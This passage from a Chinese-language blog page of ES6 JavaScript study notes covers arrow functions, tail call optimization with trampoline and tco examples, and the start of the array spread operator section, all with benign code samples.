href="#5、箭头函数" class="headerlink" title="5、箭头函数"></a>5、箭头函数</h2><h3 id="基本用法-4"><a href="#基本用法-4" class="headerlink" title="基本用法"></a>基本用法</h3><p>由于大括号被解释为代码块，所以如果箭头函数直接返回一个对象，必须在对象外面加上括号，否则会报错。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> getTempItem = <span class="function"><span class="params">id</span> =&gt;</span> &#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">&quot;Temp&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="keyword">let</span> getTempItem = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">&quot;Temp&quot;</span> &#125;);</span><br></pre></td></tr></table></figure><p>箭头函数可以与变量解构结合使用。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> full = <span class="function">(<span class="params">&#123; first, last &#125;</span>) =&gt;</span> first + <span class="string">&#x27; &#x27;</span> + last;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">full</span>(<span class="params">person</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> person.first + <span class="string">&#x27; &#x27;</span> + person.last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rest 参数与箭头函数结合的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = <span class="function">(<span class="params">...nums</span>) =&gt;</span> nums;</span><br><span class="line"></span><br><span class="line">numbers(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// [1,2,3,4,5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> headAndTail = <span class="function">(<span class="params">head, ...tail</span>) =&gt;</span> [head, tail];</span><br><span class="line"></span><br><span class="line">headAndTail(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// [1,[2,3,4,5]]</span></span><br></pre></td></tr></table></figure><h3 id="使用注意点"><a href="#使用注意点" class="headerlink" title="使用注意点"></a>使用注意点</h3><p>箭头函数有几个使用注意点。</p><p>（1）箭头函数没有自己的<code>this</code>对象。内部的<code>this</code>就是定义时上层作用域中的<code>this</code>。</p><p>（2）不可以当作构造函数，也就是说，不可以对箭头函数使用<code>new</code>命令，否则会抛出一个错误。</p><p>（3）不可以使用<code>arguments</code>对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。</p><p>（4）不可以使用<code>yield</code>命令，因此箭头函数不能用作 Generator 函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;id:&#x27;</span>, <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> id = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">foo.call(&#123; <span class="attr">id</span>: <span class="number">42</span> &#125;);</span><br><span class="line"><span class="comment">// id: 42</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>setTimeout()</code>的参数是一个箭头函数，这个箭头函数的定义生效是在<code>foo</code>函数生成时，而它的真正执行要等到 100 毫秒后。如果是普通函数，执行时<code>this</code>应该指向<strong>全局对象</strong><code>window</code>，这时应该输出<code>21</code>。但是，<strong>箭头函数</strong>导致<code>this</code>总是指向<strong>函数定义生效时所在的对象</strong>（本例是<code>&#123;id: 42&#125;</code>），所以打印出来的是<code>42</code>。</p><p>箭头函数实际上可以让<code>this</code>指向固定化，绑定<code>this</code>使得它不再可变，这种特性很有利于封装回调函数。下面是一个例子，DOM 事件的回调函数封装在一个对象里面。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">      <span class="function"><span class="params">event</span> =&gt;</span> <span class="built_in">this</span>.doSomething(event.type), <span class="literal">false</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">doSomething</span>: <span class="function"><span class="keyword">function</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Handling &#x27;</span> + type  + <span class="string">&#x27; for &#x27;</span> + <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码的<code>init()</code>方法中，使用了箭头函数，这导致这个箭头函数里面的<code>this</code>，总是指向<code>handler</code>对象。如果回调函数是普通函数，那么运行<code>this.doSomething()</code>这一行会报错，因为此时<code>this</code>指向<code>document</code>对象。</p><p><code>arguments</code>、<code>super</code>、<code>new.target</code>三个变量在箭头函数之中也是不存在的，指向外层函数的对应变量：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;args:&#x27;</span>, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment">// args: [2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure><p>由于箭头函数没有自己的<code>this</code>，所以当然也就不能用<code>call()</code>、<code>apply()</code>、<code>bind()</code>这些方法去改变<code>this</code>的指向。</p><h3 id="不适用场合"><a href="#不适用场合" class="headerlink" title="不适用场合"></a>不适用场合</h3><p>第一个场合是定义对象的方法，且该方法内部包括<code>this</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cat = &#123;</span><br><span class="line">  <span class="attr">lives</span>: <span class="number">9</span>,</span><br><span class="line">  <span class="attr">jumps</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.lives--;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个场合是需要动态<code>this</code>的时候，也不应使用箭头函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;press&#x27;</span>);</span><br><span class="line">button.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.classList.toggle(<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码运行时，点击按钮会报错，因为<code>button</code>的监听函数是一个箭头函数，导致里面的<code>this</code>就是全局对象。如果改成普通函数，<code>this</code>就会动态指向被点击的按钮对象。</p><h3 id="嵌套的箭头函数"><a href="#嵌套的箭头函数" class="headerlink" title="嵌套的箭头函数"></a>嵌套的箭头函数</h3><p>ES5 语法的多重嵌套函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">into</span>: <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">after</span>: <span class="function"><span class="keyword">function</span> (<span class="params">afterValue</span>) </span>&#123;</span><br><span class="line">      array.splice(array.indexOf(afterValue) + <span class="number">1</span>, <span class="number">0</span>, value);</span><br><span class="line">      <span class="keyword">return</span> array;</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">  &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insert(<span class="number">2</span>).into([<span class="number">1</span>, <span class="number">3</span>]).after(<span class="number">1</span>); <span class="comment">//[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>上面这个函数，可以使用箭头函数改写。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> insert = <span class="function">(<span class="params">value</span>) =&gt;</span> (&#123;<span class="attr">into</span>: <span class="function">(<span class="params">array</span>) =&gt;</span> (&#123;<span class="attr">after</span>: <span class="function">(<span class="params">afterValue</span>) =&gt;</span> &#123;</span><br><span class="line">  array.splice(array.indexOf(afterValue) + <span class="number">1</span>, <span class="number">0</span>, value);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">insert(<span class="number">2</span>).into([<span class="number">1</span>, <span class="number">3</span>]).after(<span class="number">1</span>); <span class="comment">//[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>下面是一个部署管道机制（pipeline）的例子，即前一个函数的输出是后一个函数的输入。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pipeline = <span class="function">(<span class="params">...funcs</span>) =&gt;</span></span><br><span class="line">  <span class="function"><span class="params">val</span> =&gt;</span> funcs.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b(a), val);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> plus1 = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> mult2 = <span class="function"><span class="params">a</span> =&gt;</span> a * <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> addThenMult = pipeline(plus1, mult2);</span><br><span class="line"></span><br><span class="line">addThenMult(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></table></figure><p>如果觉得上面的写法可读性比较差，也可以采用下面的写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> plus1 = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> mult2 = <span class="function"><span class="params">a</span> =&gt;</span> a * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">mult2(plus1(<span class="number">5</span>))</span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></table></figure><h2 id="6、尾调用优化"><a href="#6、尾调用优化" class="headerlink" title="6、尾调用优化"></a>6、尾调用优化</h2><h3 id="什么是尾调用？"><a href="#什么是尾调用？" class="headerlink" title="什么是尾调用？"></a>什么是尾调用？</h3><p>尾调用（Tail Call）就是指某个函数的最后一步是<strong>调用</strong>另一个函数。（且要返回）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尾调用不一定出现在函数尾部，只要是最后一步操作即可。</p><h3 id="尾调用优化"><a href="#尾调用优化" class="headerlink" title="尾调用优化"></a>尾调用优化</h3><p>函数调用会在内存形成一个“调用记录”，又称“调用帧”（call frame），保存调用位置和内部变量等信息。如果在函数<code>A</code>的内部调用函数<code>B</code>，那么在<code>A</code>的调用帧上方，还会形成一个<code>B</code>的调用帧。等到<code>B</code>运行结束，将结果返回到<code>A</code>，<code>B</code>的调用帧才会消失。如果函数<code>B</code>内部还调用函数<code>C</code>，那就还有一个<code>C</code>的调用帧，以此类推。所有的调用帧，就形成一个“调用栈”（call stack）。</p><p>尾调用由于是函数的最后一步操作，所以不需要保留外层函数的调用帧，因为调用位置、内部变量等信息都不会再用到了，只要直接用内层函数的调用帧，取代外层函数的调用帧就可以了。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> m = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> n = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> g(m + n);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> g(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">g(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>上面代码中，如果函数<code>g</code>不是尾调用，函数<code>f</code>就需要保存内部变量<code>m</code>和<code>n</code>的值、<code>g</code>的调用位置等信息。但由于调用<code>g</code>之后，函数<code>f</code>就结束了，所以执行到最后一步，完全可以删除<code>f(x)</code>的调用帧，只保留<code>g(3)</code>的调用帧。</p><p>这就叫做“尾调用优化”（Tail call optimization），即<strong>只保留内层函数的调用帧</strong>。如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。</p><p>注意，只有不再用到外层函数的内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则就无法进行“尾调用优化”。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addOne</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b + one;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> inner(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数不会进行尾调用优化，因为内层函数<code>inner</code>用到了外层函数<code>addOne</code>的内部变量<code>one</code>。</p><p>但目前只有 Safari 浏览器支持尾调用优化，Chrome 和 Firefox 都不支持。</p><h3 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h3><p>函数调用自身，称为递归。如果尾调用自身，就称为尾递归。对于尾递归来说，由于只存在一个调用帧，所以永远不会发生“栈溢出”（stack overflow）错误。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>上面代码是一个阶乘函数，计算<code>n</code>的阶乘，最多需要保存<code>n</code>个调用记录，复杂度 O(n) 。如果改写成尾递归，只保留一个调用记录，复杂度 O(1) 。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>, <span class="number">1</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>非尾递归的 Fibonacci 数列实现如下。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fibonacci</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">1</span> ) &#123;<span class="keyword">return</span> <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Fibonacci(n - <span class="number">1</span>) + Fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fibonacci(<span class="number">10</span>) <span class="comment">// 89</span></span><br><span class="line">Fibonacci(<span class="number">100</span>) <span class="comment">// 超时</span></span><br><span class="line">Fibonacci(<span class="number">500</span>) <span class="comment">// 超时</span></span><br></pre></td></tr></table></figure><p>尾递归优化过的 Fibonacci 数列实现如下。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fibonacci2</span> (<span class="params">n , ac1 = <span class="number">1</span> , ac2 = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>( n &lt;= <span class="number">1</span> ) &#123;<span class="keyword">return</span> ac2&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Fibonacci2 (n - <span class="number">1</span>, ac2, ac1 + ac2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fibonacci2(<span class="number">100</span>) <span class="comment">// 573147844013817200000</span></span><br><span class="line">Fibonacci2(<span class="number">1000</span>) <span class="comment">// 7.0330367711422765e+208</span></span><br><span class="line">Fibonacci2(<span class="number">10000</span>) <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure><h3 id="递归函数的改写"><a href="#递归函数的改写" class="headerlink" title="递归函数的改写"></a>递归函数的改写</h3><p>上面的例子，阶乘函数 factorial 需要用到一个中间变量<code>total</code>，那就把这个中间变量改写成函数的参数。这样做的缺点就是不太直观，第一眼很难看出来，为什么计算<code>5</code>的阶乘，需要传入两个参数<code>5</code>和<code>1</code>？</p><p>两个方法可以解决这个问题。方法一是在尾递归函数之外，再提供一个正常形式的函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tailFactorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>函数式编程有一个概念，叫做柯里化（currying），意思是将多参数的函数转换成单参数的形式。这里也可以使用柯里化。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">currying</span>(<span class="params">fn, n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fn.call(<span class="built_in">this</span>, m, n);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tailFactorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> factorial = currying(tailFactorial, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>第二种方法就简单多了，就是采用 ES6 的函数默认值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>上面代码中，参数<code>total</code>有默认值<code>1</code>，所以调用时不用提供这个值。</p><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p>ES6 的尾调用优化只在严格模式下开启，正常模式是无效的。这是因为在正常模式下，函数内部有两个变量，可以跟踪函数的调用栈。</p><ul><li><code>func.arguments</code>：返回调用时函数的参数。</li><li><code>func.caller</code>：返回调用当前函数的那个函数。</li></ul><p>尾调用优化发生时，函数的调用栈会改写，因此上面两个变量就会失真。严格模式禁用这两个变量，所以尾调用模式仅在严格模式下生效。</p><h3 id="尾递归优化的实现"><a href="#尾递归优化的实现" class="headerlink" title="*尾递归优化的实现"></a>*尾递归优化的实现</h3><p>正常模式下，或者那些不支持该功能的环境中，有没有办法也使用尾递归优化呢？答：自己实现尾递归优化。</p><p>尾递归之所以需要优化，原因是调用栈太多，造成溢出，那么只要减少调用栈，就不会溢出。怎么做可以减少调用栈呢？就是<strong>采用“循环”换掉“递归”</strong>。</p><p>下面是一个正常的递归函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line"><span class="comment">// Uncaught RangeError: Maximum call stack size exceeded(…)</span></span><br></pre></td></tr></table></figure><p>引入：蹦床函数（trampoline）可以将递归执行转为循环执行。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trampoline</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (f &amp;&amp; f <span class="keyword">instanceof</span> <span class="built_in">Function</span>) &#123;</span><br><span class="line">    f = f();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是蹦床函数的一个实现，它接受一个函数<code>f</code>作为参数。只要<code>f</code>执行后返回一个函数，就继续执行。注意，这里是返回一个函数，然后执行该函数，而不是函数里面调用函数，这样就避免了递归执行，从而就消除了调用栈过大的问题。然后，要做的就是将原来的递归函数，改写为每一步返回另一个函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum.bind(<span class="literal">null</span>, x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>sum</code>函数的每次执行，都会返回自身的另一个版本。现在，使用蹦床函数执行<code>sum</code>，就不会发生调用栈溢出。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">trampoline(sum(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure><p>蹦床函数并不是真正的尾递归优化，下面的实现才是。（有点难，暂时看不懂）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tco</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> value;</span><br><span class="line">  <span class="keyword">var</span> active = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> accumulated = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">accumulator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    accumulated.push(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (!active) &#123;</span><br><span class="line">      active = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">while</span> (accumulated.length) &#123;</span><br><span class="line">        value = f.apply(<span class="built_in">this</span>, accumulated.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      active = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = tco(<span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>tco</code>函数是尾递归优化的实现，它的奥妙就在于状态变量<code>active</code>。默认情况下，这个变量是不激活的。一旦进入尾递归优化的过程，这个变量就激活了。然后，每一轮递归<code>sum</code>返回的都是<code>undefined</code>，所以就避免了递归执行；而<code>accumulated</code>数组存放每一轮<code>sum</code>执行的参数，总是有值的，这就保证了<code>accumulator</code>函数内部的<code>while</code>循环总是会执行。这样就很巧妙地将“递归”改成了“循环”，而后一轮的参数会取代前一轮的参数，保证了调用栈只有一层。</p><h2 id="7、函数参数的尾逗号"><a href="#7、函数参数的尾逗号" class="headerlink" title="7、函数参数的尾逗号"></a>7、函数参数的尾逗号</h2><p>ES2017 允许函数的最后一个参数有尾逗号。</p><h2 id="8、Function-prototype-toString"><a href="#8、Function-prototype-toString" class="headerlink" title="8、Function.prototype.toString()"></a>8、Function.prototype.toString()</h2><p><a href="https://github.com/tc39/Function-prototype-toString-revision">ES2019</a> 对函数实例的<code>toString()</code>方法做出了修改。以前<code>toString()</code>方法返回函数代码本身，会省略注释和空格。修改后明确要求返回一模一样的原始代码。</p><h2 id="9、catch-命令的参数省略"><a href="#9、catch-命令的参数省略" class="headerlink" title="9、catch 命令的参数省略"></a>9、catch 命令的参数省略</h2><p>JavaScript 语言的<code>try...catch</code>结构，以前明确要求<code>catch</code>命令后面必须跟参数，接受<code>try</code>代码块抛出的错误对象。ES2019则允许<code>catch</code>语句省略参数。</p><h1 id="数组的扩展"><a href="#数组的扩展" class="headerlink" title="数组的扩展"></a>数组的扩展</h1><h2 id="1、扩展运算符"><a href="#1、扩展运算符" class="headerlink" title="1、扩展运算符"></a>1、扩展运算符</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>扩展运算符（spread）是三个点（<code>...</code>）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。</p><p>该运算符主要用于函数调用。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  array.push(...items);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扩展运算符后面还可以放置表达式。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  ...(x &gt; <span class="number">0</span> ? [<span class="string">&#x27;a&#x27;</span>] : []),</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>如果扩展运算符后面是一个空数组，则不产生任何效果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...[], <span class="number">1</span>]</span><br><span class="line"><span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><h3 id="替代函数的-apply-方法"><a href="#替代函数的-apply-方法" class="headerlink" title="替代函数的 apply 方法"></a>替代函数的 apply 方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y, z</span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">f.apply(<span class="literal">null</span>, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 